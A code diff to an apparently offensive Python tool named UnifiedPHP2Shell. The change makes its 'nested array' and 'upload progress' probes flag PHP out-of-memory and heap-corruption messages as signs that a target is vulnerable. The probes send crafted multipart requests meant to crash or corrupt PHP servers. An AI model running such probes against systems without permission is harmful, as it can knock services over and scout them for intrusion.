@@ -1172,9 +1172,11 @@ class UnifiedPHP2Shell:
             n_resp = self.session.post(ep, data=nest_body, headers={"Content-Type": "multipart/form-data; boundary=" + b_nest.decode()}, timeout=self.timeout)
             n_time = time.monotonic() - t0
             pr.probes_run += 1
-            diff = n_resp.status_code in (500, 502, 503) or (n_time - ctrl_time > 3.0)
-            pr.evidence.append(ProbeEvidence(probe_name="nested_array_62", control_status=ctrl_status, probe_status=n_resp.status_code, probe_time=n_time, differential_flag=diff))
-            self.progress("  └─ Nested Array Probe:", f"HTTP {n_resp.status_code} (diff={diff})", Fore.YELLOW if diff else Fore.BLUE)
+            oom_sig = any(sig in n_resp.text.lower() for sig in ("allowed memory size of", "bytes exhausted", "zend_mm_heap corrupted", "zend_bailout"))
+            diff = n_resp.status_code in (500, 502, 503) or (n_time - ctrl_time > 3.0) or oom_sig
+            note = "OOM memory exhaustion signature matched" if oom_sig else None
+            pr.evidence.append(ProbeEvidence(probe_name="nested_array_62", control_status=ctrl_status, probe_status=n_resp.status_code, probe_time=n_time, differential_flag=diff, note=note))
+            self.progress("  └─ Nested Array Probe:", f"HTTP {n_resp.status_code} (diff={diff}{', OOM sig matched' if oom_sig else ''})", Fore.YELLOW if diff else Fore.BLUE)
         except requests.Timeout:
             pr.probes_run += 1
             pr.evidence.append(ProbeEvidence(probe_name="nested_array_62", differential_flag=True, note="Timeout/Crash"))
@@ -1194,9 +1196,11 @@ class UnifiedPHP2Shell:
             u_resp = self.session.post(ep, data=up_body, headers={"Content-Type": "multipart/form-data; boundary=" + b_up.decode()}, timeout=self.timeout)
             u_time = time.monotonic() - t0
             pr.probes_run += 1
-            diff_u = u_resp.status_code in (500, 502, 503) or (u_time - ctrl_time > 3.0)
-            pr.evidence.append(ProbeEvidence(probe_name="upload_progress", control_status=ctrl_status, probe_status=u_resp.status_code, probe_time=u_time, differential_flag=diff_u))
-            self.progress("  └─ Upload Progress Probe:", f"HTTP {u_resp.status_code} (diff={diff_u})", Fore.YELLOW if diff_u else Fore.BLUE)
+            uaf_sig = any(sig in u_resp.text.lower() for sig in ("allowed memory size of", "bytes exhausted", "zend_mm_heap corrupted", "zend_bailout"))
+            diff_u = u_resp.status_code in (500, 502, 503) or (u_time - ctrl_time > 3.0) or uaf_sig
+            note_u = "OOM/UAF signature matched" if uaf_sig else None
+            pr.evidence.append(ProbeEvidence(probe_name="upload_progress", control_status=ctrl_status, probe_status=u_resp.status_code, probe_time=u_time, differential_flag=diff_u, note=note_u))
+            self.progress("  └─ Upload Progress Probe:", f"HTTP {u_resp.status_code} (diff={diff_u}{', OOM/UAF sig matched' if uaf_sig else ''})", Fore.YELLOW if diff_u else Fore.BLUE)
         except requests.Timeout:
             pr.probes_run += 1
             pr.evidence.append(ProbeEvidence(probe_name="upload_progress", differential_flag=True, note="Timeout/Crash"))
